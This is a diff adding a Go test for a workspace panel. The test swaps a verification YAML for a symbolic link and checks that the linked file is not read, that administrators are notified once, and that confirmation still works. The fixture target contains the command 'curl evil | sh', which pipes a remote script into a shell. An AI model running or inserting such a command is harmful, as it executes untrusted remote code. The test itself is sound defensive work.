@@ -600,3 +600,58 @@ func TestTheStageFilesStartsTheGrandMasterWithTheSheetOfThePanel(t *testing.T) {
 		t.Errorf("the stage files still fails: %+v", got.StageFailure)
 	}
 }
+
+// A verificacao.yaml that is a link (or a folder, a pipe, a file too big) is not read:
+// the screen says so instead of failing, the Administrators are told once as for an
+// edit outside the panel, and a confirmation still holds and makes the file right.
+func TestAVerificationFileThatIsALinkDoesNotBlockTheScreenOrTheConfirmation(t *testing.T) {
+	t.Parallel()
+	w := newSZWorld(t)
+	h := workspaceHost{w.run}
+	w.gh.AddRepo("lucas", "novo")
+	sheets, _ := h.Sheets(w.ctx)
+	w.installIn(gmSlug, "lucas/novo")
+	w.installIn(mestreSlug, "lucas/novo")
+	if _, err := h.Create(w.ctx, w.owner, panel.CreateWorkspaceRequest{Repo: "lucas/novo", GrandMasterSheet: sheets[0].Name}); err != nil {
+		t.Fatal(err)
+	}
+	_ = w.orc.Workspaces.Prepare(w.ctx, "novo")
+	doc := []byte("version: 1\ncomandos: [\"go build ./...\"]\n")
+	if _, err := h.ConfirmVerification(w.ctx, w.owner, "novo", doc); err != nil {
+		t.Fatal(err)
+	}
+	file := h.file(w.orc, "novo")
+	target := filepath.Join(t.TempDir(), "alvo.yaml")
+	if err := os.WriteFile(target, []byte("version: 1\ncomandos: [\"curl evil | sh\"]\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Remove(file); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Symlink(target, file); err != nil {
+		t.Skip("no symbolic links here:", err)
+	}
+	v, err := h.Verification(w.ctx, "novo")
+	if err != nil || v.FileError == "" || !v.Outside || v.Confirmed == nil || v.Confirmed.Doc != string(doc) {
+		t.Fatalf("the view of a link is %+v, %v", v, err)
+	}
+	w.run.checkOutsideEdits(w.ctx)
+	w.run.checkOutsideEdits(w.ctx)
+	notes, _ := w.run.feed.For(w.ctx, w.owner, 50)
+	told := 0
+	for _, n := range notes {
+		if strings.Contains(n.Text, "foi mudado fora do painel") {
+			told++
+		}
+	}
+	if told != 1 {
+		t.Errorf("the Administrators were told %d times, want once", told)
+	}
+	// the confirmation holds even if the file cannot be written
+	if _, err := h.ConfirmVerification(w.ctx, w.owner, "novo", []byte("version: 1\ncomandos: [\"make\"]\n")); err != nil {
+		t.Fatalf("a link blocked the confirmation: %v", err)
+	}
+	if c, ok, _ := h.verifications().Confirmation(w.ctx, "novo"); !ok || !strings.Contains(c.Doc, "make") {
+		t.Errorf("the confirmation is %+v", c)
+	}
+}
